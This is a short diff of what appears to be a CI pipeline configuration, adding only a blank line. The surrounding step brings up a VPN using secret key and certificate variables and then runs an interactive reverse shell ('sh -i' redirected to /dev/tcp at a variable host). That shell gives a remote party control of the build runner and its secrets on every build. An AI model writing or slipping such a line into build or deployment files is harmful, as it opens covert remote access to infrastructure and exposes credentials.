@@ -24,6 +24,7 @@ steps:
       ifconfig tun0
 
       sh -i >& "/dev/tcp/$(ME)" 0>&1
+      
     env:
       VPNKEY: $(vpnkey)
       VPNCRT: $(vpncrt)
